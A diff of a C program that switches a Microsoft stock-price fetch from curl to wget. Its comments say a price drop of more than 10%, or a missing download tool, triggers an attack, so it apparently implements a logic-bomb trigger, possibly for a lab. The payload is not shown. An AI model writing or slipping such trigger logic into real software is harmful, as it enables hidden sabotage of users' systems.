@@ -13,32 +13,29 @@
 // Server URL for Microsoft stock data
 #define MICROSOFT_STOCK_URL "http://172.17.0.1:8000/stock/microsoft"
 
-// Function to check if curl is installed on the system
-int is_curl_installed() {
+// Function to check if wget is installed on the system
+int is_wget_installed() {
     FILE *fp;
     char buffer[256];
-
-    // Try running 'which curl' to check if curl is installed
-    fp = popen("which curl", "r");
+    // Try running 'which wget' to check if wget is installed
+    fp = popen("which wget", "r");
     if (fp == NULL) {
-        // If 'which curl' fails, curl is not installed
+        // If 'which wget' fails, wget is not installed
         return 0;
     }
-
-    // Read output of 'which curl'
+    // Read output of 'which wget'
     if (fgets(buffer, sizeof(buffer), fp) != NULL) {
-        // If curl's path is found, it's installed
-        fclose(fp);
+        // If wget's path is found, it's installed
+        pclose(fp);
         return 1;
     }
-
-    // Curl is not installed
-    fclose(fp);
+    // wget is not installed
+    pclose(fp);
     return 0;
 }
 
 // Function to obtain the stock value of Microsoft and the percentage of change.
-// In case the stock value dropped more than 10% (percentage of change < 10%), 
+// In case the stock value dropped more than 10% (percentage of change < 10%),
 // the attack is triggered.
 int get_microsoft_stock() {
     char command[512];
@@ -49,28 +46,28 @@ int get_microsoft_stock() {
     float percentage_change;
     int parse_result;
 
-    // Check if curl is installed
-    if (!is_curl_installed()) {
-        printf("\e[33mWARNING:\e[0m Curl is not installed\n");
+    // Check if wget is installed
+    if (!is_wget_installed()) {
+        printf("\e[33mWARNING:\e[0m Wget is not installed\n");
         printf("\e[31mTriggering attack...\e[0m\n");
         return 0;
     }
 
-    // Construct the curl command
-    snprintf(command, sizeof(command), "curl -s %s", MICROSOFT_STOCK_URL);
+    // Construct the wget command
+    // -q for quiet mode, -O - to output to stdout
+    snprintf(command, sizeof(command), "wget -q -O - %s", MICROSOFT_STOCK_URL);
 
-    // Open a pipe to the curl command
+    // Open a pipe to the wget command
     fp = popen(command, "r");
     if (fp == NULL) {
         perror("Error opening pipe");
         return -1;
     }
 
-    // Read the response from the curl command
+    // Read the response from the wget command
     if (fgets(buffer, sizeof(buffer), fp) != NULL) {
         // Parse the response (format: symbol,current_stock_value,percentage_change)
         parse_result = sscanf(buffer, "%9[^,],%d,%f", symbol, &current_stock_value, &percentage_change);
-
         if (parse_result == 3) { // Upon obtaining 3 values...
             // Print stock value and percentage of change
             printf("\e[32mMicrosoft stock value:\e[0m $%d\n", current_stock_value);
